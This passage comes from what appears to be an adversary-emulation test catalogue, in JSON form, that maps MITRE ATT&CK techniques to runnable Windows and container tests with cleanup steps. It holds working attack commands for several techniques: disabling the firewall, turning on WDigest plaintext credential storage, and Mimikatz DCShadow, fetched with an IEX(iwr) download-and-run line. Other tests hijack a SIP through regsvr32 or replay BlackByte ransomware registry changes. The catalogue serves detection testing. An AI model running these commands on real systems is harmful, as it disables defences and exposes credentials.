{"name": "LockBit Black - Unusual Windows firewall registry modification -cmd", "auto_generated_guid": "a4651931-ebbb-4cde-9363-ddf3d66214cb", "description": "An adversary tries to modify the windows firewall registry\n", "supported_platforms": ["windows"], "executor": {"command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile\" /v EnableFirewall /t REG_DWORD /d 0 /f\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\StandardProfile\" /v EnableFirewall /t REG_DWORD /d 0 /f\n", "cleanup_command": "reg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile\" /v EnableFirewall /f >nul 2>&1\nreg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\StandardProfile\" /v EnableFirewall /f >nul 2>&1\n", "name": "command_prompt", "elevation_required": true}}, {"name": "LockBit Black - Unusual Windows firewall registry modification -Powershell", "auto_generated_guid": "80b453d1-eec5-4144-bf08-613a6c3ffe12", "description": "An adversary tries to modify the windows firewall registry.\n", "supported_platforms": ["windows"], "executor": {"command": "New-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile\" -Name EnableFirewall -PropertyType DWORD -Value 0 -Force\nNew-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\StandardProfile\" -Name EnableFirewall -PropertyType DWORD -Value 0 -Force\n", "cleanup_command": "Remove-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile\"  -Name EnableFirewall -Force -ErrorAction Ignore\nRemove-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\StandardProfile\" -Name EnableFirewall -Force -ErrorAction Ignore\n", "name": "powershell", "elevation_required": true}}, {"name": "Blackbit - Disable Windows Firewall using netsh firewall", "auto_generated_guid": "91f348e6-3760-4997-a93b-2ceee7f254ee", "description": "An adversary tries to modify the windows firewall configuration using the deprecated netsh firewall command (command still works).     \n", "supported_platforms": ["windows"], "executor": {"command": "netsh firewall set opmode mode=disable\n", "cleanup_command": "netsh firewall set opmode mode=enable >nul 2>&1\n", "name": "command_prompt", "elevation_required": true}}]}, "T1560": {"name": "Archive Collected Data", "technique_id": "attack-pattern--53ac20cd-aca3-406e-9aa0-9fc7fdc60a5a", "external_id": "T1560", "data_components": ["Command Execution", "File Creation", "Process Creation", "Script Execution"], "kill_chain_phases": ["collection"], "data_source_platforms": [], "mitigations": ["course-of-action--cc2399fd-3cd3-4319-8d0a-fbd6420cdaf8"], "description": "An adversary may compress and/or encrypt data that is collected prior to exfiltration. Compressing the data can help to obfuscate the collected data and minimize the amount of data sent over the network. Encryption can be used to hide information that is being exfiltrated from detection or make exfiltration less conspicuous upon inspection by a defender.\n\nBoth compression and encryption are done prior to exfiltration, and can be performed using a utility, 3rd party library, or custom method.", "atomic_tests": [{"name": "Compress Data for Exfiltration With PowerShell", "auto_generated_guid": "41410c60-614d-4b9d-b66e-b0192dd9c597", "description": "An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration.\nWhen the test completes you should find the files from the $env:USERPROFILE directory compressed in a file called T1560-data-ps.zip in the $env:USERPROFILE directory \n", "supported_platforms": ["windows"], "input_arguments": {"input_file": {"description": "Path that should be compressed into our output file", "type": "path", "default": "$env:USERPROFILE"}, "output_file": {"description": "Path where resulting compressed data should be placed", "type": "path", "default": "$env:USERPROFILE\\T1560-data-ps.zip"}}, "executor": {"name": "powershell", "elevation_required": false, "command": "dir #{input_file} -Recurse | Compress-Archive -DestinationPath #{output_file}\n", "cleanup_command": "Remove-Item -path #{output_file} -ErrorAction Ignore"}}]}, "T1553.003": {"name": "SIP and Trust Provider Hijacking", "technique_id": "attack-pattern--543fceb5-cb92-40cb-aacf-6913d4db58bc", "external_id": "T1553.003", "data_components": ["Windows Registry Key Modification", "Module Load", "File Modification"], "kill_chain_phases": ["defense-evasion"], "data_source_platforms": [], "mitigations": ["course-of-action--47e0e9fe-96ce-4f65-8bb1-8be1feacb5db", "course-of-action--987988f0-cf86-4680-a875-2f6456ab2448", "course-of-action--a2c36a5d-4058-475e-8e77-fff75e50d3b9"], "description": "Adversaries may tamper with SIP and trust provider components to mislead the operating system and application control tools when conducting signature validation checks. In user mode, Windows Authenticode (Citation: Microsoft Authenticode) digital signatures are used to verify a file's origin and integrity, variables that may be used to establish trust in signed code (ex: a driver with a valid Microsoft signature may be handled as safe). The signature validation process is handled via the WinVerifyTrust application programming interface (API) function,  (Citation: Microsoft WinVerifyTrust) which accepts an inquiry and coordinates with the appropriate trust provider, which is responsible for validating parameters of a signature. (Citation: SpectorOps Subverting Trust Sept 2017)\n\nBecause of the varying executable file types and corresponding signature formats, Microsoft created software components called Subject Interface Packages (SIPs) (Citation: EduardosBlog SIPs July 2008) to provide a layer of abstraction between API functions and files. SIPs are responsible for enabling API functions to create, retrieve, calculate, and verify signatures. Unique SIPs exist for most file formats (Executable, PowerShell, Installer, etc., with catalog signing providing a catch-all  (Citation: Microsoft Catalog Files and Signatures April 2017)) and are identified by globally unique identifiers (GUIDs). (Citation: SpectorOps Subverting Trust Sept 2017)\n\nSimilar to [Code Signing](https://attack.mitre.org/techniques/T1553/002), adversaries may abuse this architecture to subvert trust controls and bypass security policies that allow only legitimately signed code to execute on a system. Adversaries may hijack SIP and trust provider components to mislead operating system and application control tools to classify malicious (or any) code as signed by: (Citation: SpectorOps Subverting Trust Sept 2017)\n\n* Modifying the <code>Dll</code> and <code>FuncName</code> Registry values in <code>HKLM\\SOFTWARE[\\WOW6432Node\\]Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllGetSignedDataMsg\\{SIP_GUID}</code> that point to the dynamic link library (DLL) providing a SIP\u2019s CryptSIPDllGetSignedDataMsg function, which retrieves an encoded digital certificate from a signed file. By pointing to a maliciously-crafted DLL with an exported function that always returns a known good signature value (ex: a Microsoft signature for Portable Executables) rather than the file\u2019s real signature, an adversary can apply an acceptable signature value to all files using that SIP (Citation: GitHub SIP POC Sept 2017) (although a hash mismatch will likely occur, invalidating the signature, since the hash returned by the function will not match the value computed from the file).\n* Modifying the <code>Dll</code> and <code>FuncName</code> Registry values in <code>HKLM\\SOFTWARE\\[WOW6432Node\\]Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData\\{SIP_GUID}</code> that point to the DLL providing a SIP\u2019s CryptSIPDllVerifyIndirectData function, which validates a file\u2019s computed hash against the signed hash value. By pointing to a maliciously-crafted DLL with an exported function that always returns TRUE (indicating that the validation was successful), an adversary can successfully validate any file (with a legitimate signature) using that SIP (Citation: GitHub SIP POC Sept 2017) (with or without hijacking the previously mentioned CryptSIPDllGetSignedDataMsg function). This Registry value could also be redirected to a suitable exported function from an already present DLL, avoiding the requirement to drop and execute a new file on disk.\n* Modifying the <code>DLL</code> and <code>Function</code> Registry values in <code>HKLM\\SOFTWARE\\[WOW6432Node\\]Microsoft\\Cryptography\\Providers\\Trust\\FinalPolicy\\{trust provider GUID}</code> that point to the DLL providing a trust provider\u2019s FinalPolicy function, which is where the decoded and parsed signature is checked and the majority of trust decisions are made. Similar to hijacking SIP\u2019s CryptSIPDllVerifyIndirectData function, this value can be redirected to a suitable exported function from an already present DLL or a maliciously-crafted DLL (though the implementation of a trust provider is complex).\n* **Note:** The above hijacks are also possible without modifying the Registry via [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001).\n\nHijacking SIP or trust provider components can also enable persistent code execution, since these malicious components may be invoked by any application that performs code signing or signature validation. (Citation: SpectorOps Subverting Trust Sept 2017)", "atomic_tests": [{"name": "SIP (Subject Interface Package) Hijacking via Custom DLL", "auto_generated_guid": "e12f5d8d-574a-4e9d-8a84-c0e8b4a8a675", "description": "Registers a DLL that logs signature checks, mimicking SIP hijacking. This test uses a DLL from \nhttps://github.com/gtworek/PSBits/tree/master/SIP and registers it using regsvr32, thereby causing\nthe system to utilize it during signature checks, and logging said checks.\n", "supported_platforms": ["windows"], "input_arguments": {"dll_payload": {"description": "Path to GTSIPProvider.dll", "type": "path", "default": "PathToAtomicsFolder\\T1553.003\\bin\\GTSIPProvider.dll"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "GTSIPProvider.dll must exist on disk at specified location (#{dll_payload})\n", "prereq_command": "if (Test-Path \"#{dll_payload}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{dll_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/gtworek/PSBits/raw/2aa885c7d09f7f100997bfa5ee0c404084177f24/SIP/GTSIPProvider.dll\" -OutFile \"#{dll_payload}\"\n"}], "executor": {"command": "regsvr32.exe #{dll_payload}\n", "cleanup_command": "regsvr32.exe /u #{dll_payload}\n", "name": "command_prompt", "elevation_required": true}}]}, "T1207": {"name": "Rogue Domain Controller", "technique_id": "attack-pattern--564998d8-ab3e-4123-93fb-eccaa6b9714a", "external_id": "T1207", "data_components": ["Network Traffic Content", "Active Directory Object Creation", "User Account Authentication", "Active Directory Object Modification"], "kill_chain_phases": ["defense-evasion"], "data_source_platforms": [], "mitigations": null, "description": "Adversaries may register a rogue Domain Controller to enable manipulation of Active Directory data. DCShadow may be used to create a rogue Domain Controller (DC). DCShadow is a method of manipulating Active Directory (AD) data, including objects and schemas, by registering (or reusing an inactive registration) and simulating the behavior of a DC. (Citation: DCShadow Blog) Once registered, a rogue DC may be able to inject and replicate changes into AD infrastructure for any domain object, including credentials and keys.\n\nRegistering a rogue DC involves creating a new server and nTDSDSA objects in the Configuration partition of the AD schema, which requires Administrator privileges (either Domain or local to the DC) or the KRBTGT hash. (Citation: Adsecurity Mimikatz Guide)\n\nThis technique may bypass system logging and security monitors such as security information and event management (SIEM) products (since actions taken on a rogue DC may not be reported to these sensors). (Citation: DCShadow Blog) The technique may also be used to alter and delete replication and other associated metadata to obstruct forensic analysis. Adversaries may also utilize this technique to perform [SID-History Injection](https://attack.mitre.org/techniques/T1134/005) and/or manipulate AD objects (such as accounts, access control lists, schemas) to establish backdoors for Persistence. (Citation: DCShadow Blog)", "atomic_tests": [{"name": "DCShadow (Active Directory)", "auto_generated_guid": "0f4c5eb0-98a0-4496-9c3d-656b4f2bc8f6", "description": "Use Mimikatz DCShadow method to simulate behavior of an Active Directory Domain Controller and edit protected attribute.\n\n[DCShadow](https://www.dcshadow.com/)\n[Additional Reference](http://www.labofapenetrationtester.com/2018/04/dcshadow.html)\n\nIt will set the badPwdCount attribute of the target user (user/machine account) to 9999. You can check after with:\nGet-ADObject -LDAPFilter '(samaccountname=<user>)' -Properties badpwdcount | select-object -ExpandProperty badpwdcount\n\nNeed SYSTEM privileges locally (automatically obtained via PsExec, so running as admin is sufficient), and Domain Admin remotely.\nThe easiest is to run elevated and as a Domain Admin user.\n", "supported_platforms": ["windows"], "input_arguments": {"object": {"description": "Targeted object (for machine account do not forget to add final '$')", "type": "string", "default": "bruce.wayne"}, "attribute": {"description": "Object attribute to edit, interesting ones: badpwdcount, primaryGroupId, SIDHistory...", "type": "string", "default": "badpwdcount"}, "value": {"description": "Value to assign to object attribute", "type": "string", "default": "9999"}, "mimikatz_path": {"description": "Mimikatz windows executable", "type": "path", "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\mimikatz\\x64\\mimikatz.exe"}, "psexec_path": {"description": "Path to PsExec", "type": "path", "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\PSTools\\PsExec.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})\n", "prereq_command": "$mimikatz_path = cmd /c echo #{mimikatz_path}\nif (Test-Path $mimikatz_path) {exit 0} else {exit 1}\n", "get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(\".zip\") }\n$mimikatz_exe = cmd /c echo #{mimikatz_path}\n$basePath = Split-Path $mimikatz_exe | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath\n"}, {"description": "PsExec tool from Sysinternals must exist on disk at specified location (#{psexec_path})\n", "prereq_command": "if (Test-Path \"#{psexec_path}\") { exit 0} else { exit 1}\n", "get_prereq_command": "Invoke-WebRequest \"https://download.sysinternals.com/files/PSTools.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools\" -Force\nNew-Item -ItemType Directory (Split-Path \"#{psexec_path}\") -Force | Out-Null\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools\\PsExec.exe\" \"#{psexec_path}\" -Force\n"}], "executor": {"name": "powershell", "elevation_required": true, "command": "# starting fake DC server, as SYSTEM (required)\n$dc_output_file = \"PathToAtomicsFolder\\..\\ExternalPayloads\\art-T1207-mimikatz-DC.log\"\nRemove-Item $dc_output_file -ErrorAction Ignore\n$mimikatzParam =\"`\"log $dc_output_file`\" `\"lsadump::dcshadow /object:#{object} /attribute:#{attribute} /value:#{value}`\" `\"exit`\"\"\n$dc = Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList \"/c '#{psexec_path}' /accepteula -d -s #{mimikatz_path} $mimikatzParam\"\n\n# wait for fake DC server to be ready...\nStart-Sleep -Seconds 5\n\n# server ready, so trigger replication (push) and wait until it finished\n& \"#{mimikatz_path}\" \"lsadump::dcshadow /push\" \"exit\"\n\nWrite-Host \"`nWaiting for fake DC server to return\"\nWait-Process $dc\n\nWrite-Host \"`nOutput from fake DC server:\"\nGet-Content $dc_output_file\nStart-Sleep 1 # wait a little until the file is not locked anymore so we can actually delete it\nRemove-Item $dc_output_file -ErrorAction Ignore\n\nWrite-Host \"End of DCShadow\"\n", "cleanup_command": "Stop-Process -Name \"mimikatz\" -Force -ErrorAction Ignore\n"}}]}, "T1610": {"name": "Deploy Container", "technique_id": "attack-pattern--56e0d8b8-3e25-49dd-9050-3aa252f5aa92", "external_id": "T1610", "data_components": ["Pod Modification", "Container Creation", "Pod Creation", "Application Log Content", "Container Start"], "kill_chain_phases": ["defense-evasion", "execution"], "data_source_platforms": [], "mitigations": ["course-of-action--1dcaeb21-9348-42ea-950a-f842aaf1ae1f", "course-of-action--86598de0-b347-4928-9eb0-0acbfc21908c", "course-of-action--93e7968a-9074-4eac-8ae9-9f5200ec3317", "course-of-action--cc2399fd-3cd3-4319-8d0a-fbd6420cdaf8"], "description": "Adversaries may deploy a container into an environment to facilitate execution or evade defenses. In some cases, adversaries may deploy a new container to execute processes associated with a particular image or deployment, such as processes that execute or download malware. In others, an adversary may deploy a new container configured without network rules, user limitations, etc. to bypass existing defenses within the environment.\n\nContainers can be deployed by various means, such as via Docker's <code>create</code> and <code>start</code> APIs or via a web application such as the Kubernetes dashboard or Kubeflow.(Citation: Docker Containers API)(Citation: Kubernetes Dashboard)(Citation: Kubeflow Pipelines) Adversaries may deploy containers based on retrieved or built malicious images or from benign images that download and execute malicious payloads at runtime.(Citation: Aqua Build Images on Hosts)", "atomic_tests": [{"name": "Deploy Docker container", "auto_generated_guid": "59aa6f26-7620-417e-9318-589e0fb7a372", "description": "Adversaries may deploy containers based on retrieved or built malicious images or from benign images that download and execute malicious payloads at runtime. They can do this using docker create and docker start commands. Kinsing & Doki was exploited using this technique. \n", "supported_platforms": ["containers"], "dependency_executor_name": "sh", "dependencies": [{"description": "Verify docker is installed.", "prereq_command": "which docker\n", "get_prereq_command": "if [ \"\" == \"`which docker`\" ]; then echo \"Docker Not Found\"; if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install docker ; elif [ -n \"`which yum`\" ]; then sudo yum -y install docker ; fi ; else echo \"Docker installed\"; fi\n"}, {"description": "Verify docker service is running.", "prereq_command": "sudo systemctl status docker  --no-pager\n", "get_prereq_command": "sudo systemctl start docker\n"}], "executor": {"command": "docker build -t t1610 $PathtoAtomicsFolder/T1610/src/\ndocker run --name t1610_container --rm -itd t1610 bash /tmp/script.sh\n", "name": "bash", "cleanup_command": "docker stop t1610_container\ndocker rmi -f t1610:latest \n"}}]}, "T1112": {"name": "Modify Registry", "technique_id": "attack-pattern--57340c81-c025-4189-8fa0-fc7ede51bae4", "external_id": "T1112", "data_components": ["OS API Execution", "Process Creation", "Windows Registry Key Deletion", "Windows Registry Key Modification", "Command Execution", "Windows Registry Key Creation"], "kill_chain_phases": ["defense-evasion"], "data_source_platforms": [], "mitigations": ["course-of-action--a2c36a5d-4058-475e-8e77-fff75e50d3b9"], "description": "Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.\n\nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility [Reg](https://attack.mitre.org/software/S0075) may be used for local or remote Registry modification. (Citation: Microsoft Reg) Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.\n\nRegistry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via [Reg](https://attack.mitre.org/software/S0075) or other utilities using the Win32 API. (Citation: Microsoft Reghide NOV 2006) Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence. (Citation: TrendMicro POWELIKS AUG 2014) (Citation: SpectorOps Hiding Reg Jul 2017)\n\nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system. (Citation: Microsoft Remote) Often [Valid Accounts](https://attack.mitre.org/techniques/T1078) are required, along with access to the remote system's [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) for RPC communication.", "atomic_tests": [{"name": "Modify Registry of Current User Profile - cmd", "auto_generated_guid": "1324796b-d0f6-455a-b4ae-21ffee6aa6b9", "description": "Modify the registry of the currently logged in user using reg.exe via cmd console. Upon execution, the message \"The operation completed successfully.\"\nwill be displayed. Additionally, open Registry Editor to view the new entry in HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced.\n", "supported_platforms": ["windows"], "executor": {"command": "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /t REG_DWORD /v HideFileExt /d 1 /f\n", "cleanup_command": "reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v HideFileExt /f >nul 2>&1\n", "name": "command_prompt"}}, {"name": "Modify Registry of Local Machine - cmd", "auto_generated_guid": "282f929a-6bc5-42b8-bd93-960c3ba35afe", "description": "Modify the Local Machine registry RUN key to change Windows Defender executable that should be ran on startup.  This should only be possible when\nCMD is ran as Administrative rights. Upon execution, the message \"The operation completed successfully.\"\nwill be displayed. Additionally, open Registry Editor to view the modified entry in HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run.\n", "supported_platforms": ["windows"], "input_arguments": {"new_executable": {"description": "New executable to run on startup instead of Windows Defender", "type": "string", "default": "calc.exe"}}, "executor": {"command": "reg add HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /t REG_EXPAND_SZ /v SecurityHealth /d #{new_executable} /f\n", "cleanup_command": "reg delete HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SecurityHealth /f >nul 2>&1\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Modify registry to store logon credentials", "auto_generated_guid": "c0413fb5-33e2-40b7-9b6f-60b29f4a7a18", "description": "Sets registry key that will tell windows to store plaintext passwords (making the system vulnerable to clear text / cleartext password dumping).\nUpon execution, the message \"The operation completed successfully.\" will be displayed.\nAdditionally, open Registry Editor to view the modified entry in HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest.\n", "supported_platforms": ["windows"], "executor": {"command": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f\n", "cleanup_command": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f >nul 2>&1\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Add domain to Trusted sites Zone", "auto_generated_guid": "cf447677-5a4e-4937-a82c-e47d254afd57", "description": "Attackers may add a domain to the trusted site zone to bypass defenses. Doing this enables attacks such as c2 over office365.\nUpon execution, details of the new registry entries will be displayed.\nAdditionally, open Registry Editor to view the modified entry in HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\.\n\nhttps://www.blackhat.com/docs/us-17/wednesday/us-17-Dods-Infecting-The-Enterprise-Abusing-Office365-Powershell-For-Covert-C2.pdf\n", "supported_platforms": ["windows"], "input_arguments": {"bad_domain": {"description": "Domain to add to trusted site zone", "type": "string", "default": "bad-domain.com"}}, "executor": {"command": "$key= \"HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\Domains\\#{bad_domain}\\\"\n$name =\"bad-subdomain\"\nnew-item $key -Name $name -Force\nnew-itemproperty $key$name -Name https -Value 2 -Type DWORD;\nnew-itemproperty $key$name -Name http  -Value 2 -Type DWORD;\nnew-itemproperty $key$name -Name *     -Value 2 -Type DWORD;\n", "cleanup_command": "$key = \"HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\Domains\\#{bad_domain}\\\"\nRemove-item  $key -Recurse -ErrorAction Ignore\n", "name": "powershell"}}, {"name": "Javascript in registry", "auto_generated_guid": "15f44ea9-4571-4837-be9e-802431a7bfae", "description": "Upon execution, a javascript block will be placed in the registry for persistence.\nAdditionally, open Registry Editor to view the modified entry in HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings.\n", "supported_platforms": ["windows"], "executor": {"command": "New-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" -Name T1112 -Value \"<script>\"\n", "cleanup_command": "Remove-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" -Name T1112 -ErrorAction Ignore\n", "name": "powershell"}}, {"name": "Change Powershell Execution Policy to Bypass", "auto_generated_guid": "f3a6cceb-06c9-48e5-8df8-8867a6814245", "description": "Attackers need to change the powershell execution policy in order to run their malicious powershell scripts.\nThey can either specify it during the execution of the powershell script or change the registry value for it.\n", "supported_platforms": ["windows"], "input_arguments": {"default_execution_policy": {"description": "Specify the default poweshell execution policy", "type": "string", "default": "Default"}}, "executor": {"command": "Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine\n", "cleanup_command": "try { Set-ExecutionPolicy -ExecutionPolicy #{default_execution_policy} -Scope LocalMachine -Force } catch {}\n", "name": "powershell"}}, {"name": "BlackByte Ransomware Registry Changes - CMD", "auto_generated_guid": "4f4e2f9f-6209-4fcf-9b15-3b7455706f5b", "description": "This task recreates the steps taken by BlackByte ransomware before it worms to other machines.  See \"Preparing to Worm\" section: https://redcanary.com/blog/blackbyte-ransomware/\nThe steps are as follows:\n<ol>\n    <li>1. Elevate Local Privilege by disabling UAC Remote Restrictions</li>\n    <li>2. Enable OS to share network connections between different privilege levels</li>\n    <li>3. Enable long path values for file paths, names, and namespaces to ensure encryption of all file names and paths</li>\n</ol>\nThe registry keys and their respective values will be created upon successful execution.\n", "supported_platforms": ["windows"], "executor": {"command": "cmd.exe /c reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f\ncmd.exe /c reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLinkedConnections /t REG_DWORD /d 1 /f\ncmd.exe /c reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\FileSystem /v LongPathsEnabled /t REG_DWORD /d 1 /f\n", "cleanup_command": "reg delete HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ /v LocalAccountTokenFilterPolicy /f >nul 2>&1\nreg delete HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ /v EnableLinkedConnections /f >nul 2>&1\nreg delete HKLM\\SYSTEM\\CurrentControlSet\\Control\\FileSystem\\ /v LongPathsEnabled /f >nul 2>&1\n", "name": "command_prompt", "elevation_required": true}}, {"name": "BlackByte Ransomware Registry Changes - Powershell", "auto_generated_guid": "0b79c06f-c788-44a2-8630-d69051f1123d", "description": "This task recreates the steps taken by BlackByte ransomware before it worms to other machines via Powershell.  See \"Preparing to Worm\" section: https://redcanary.com/blog/blackbyte-ransomware/\nThe steps are as follows:\n<ol>\n    <li>1. Elevate Local Privilege by disabling UAC Remote Restrictions</li>\n    <li>2. Enable OS to share network connections between different privilege levels</li>\n    <li>3. Enable long path values for file paths, names, and namespaces to ensure encryption of all file names and paths</li>\n</ol>\nThe registry keys and their respective values will be created upon successful execution.\n", "supported_platforms": ["windows"], "executor": {"command": "New-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name LocalAccountTokenFilterPolicy -PropertyType DWord -Value 1 -Force\nNew-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name EnableLinkedConnections -PropertyType DWord -Value 1 -Force\nNew-ItemProperty \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\FileSystem\" -Name LongPathsEnabled -PropertyType DWord -Value 1 -Force\n", "cleanup_command": "Remove-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name LocalAccountTokenFilterPolicy -Force -ErrorAction Ignore\nRemove-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name EnableLinkedConnections -Force -ErrorAction Ignore\nRemove-ItemProperty \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\FileSystem\" -Name LongPathsEnabled -Force -ErrorAction Ignore\n", "name": "powershell", "elevation_required": true}}, {"name": "Disable Windows Registry Tool", "auto_generated_guid": "ac34b0f7-0f85-4ac0-b93e-3ced2bc69bb8", "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows registry tool to prevent user modifying registry entry.\nSee example how Agent Tesla malware abuses this technique: https://any.run/report/ea4ea08407d4ee72e009103a3b77e5a09412b722fdef67315ea63f22011152af/a866d7b1-c236-4f26-a391-5ae32213dfc4#registry\n", "supported_platforms": ["windows"], "executor": {"command": "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableRegistryTools /t REG_DWORD /d 1 /f\n", "cleanup_command": "powershell Remove-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system\" -Name DisableRegistryTools -ErrorAction Ignore\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Disable Windows CMD application", "auto_generated_guid": "d2561a6d-72bd-408c-b150-13efe1801c2a", "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows CMD application.\nSee example how Agent Tesla malware abuses this technique: https://any.run/report/ea4ea08407d4ee72e009103a3b77e5a09412b722fdef67315ea63f22011152af/a866d7b1-c236-4f26-a391-5ae32213dfc4#registry\n", "supported_platforms": ["windows"], "executor": {"command": "New-ItemProperty -Path \"HKCU:\\Software\\Policies\\Microsoft\\Windows\\System\" -Name DisableCMD -Value 1\n", "cleanup_command": "Remove-ItemProperty -Path \"HKCU:\\Software\\Policies\\Microsoft\\Windows\\System\" -Name DisableCMD -ErrorAction Ignore\n", "name": "powershell", "elevation_required": true}}, {"name": "Disable Windows Task Manager application", "auto_generated_guid": "af254e70-dd0e-4de6-9afe-a994d9ea8b62", "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows task manager application.\nSee example how Agent Tesla malware abuses this technique: https://any.run/report/ea4ea08407d4ee72e009103a3b77e5a09412b722fdef67315ea63f22011152af/a866d7b1-c236-4f26-a391-5ae32213dfc4#registry\n", "supported_platforms": ["windows"], "executor": {"command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableTaskmgr /t REG_DWORD /d 1 /f\n", "cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableTaskmgr /f >nul 2>&1\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Disable Windows Notification Center", "auto_generated_guid": "c0d6d67f-1f63-42cc-95c0-5fd6b20082ad", "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows notification center.\nSee how remcos rat abuses this technique- https://tccontre.blogspot.com/2020/01/remcos-rat-evading-windows-defender-av.html\n", "supported_platforms": ["windows"], "executor": {"command": "reg add HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\Explorer /v DisableNotificationCenter /t REG_DWORD /d 1 /f\n", "cleanup_command": "reg delete HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\Explorer /v DisableNotificationCenter /f >nul 2>&1\n", "name": "command_prompt", 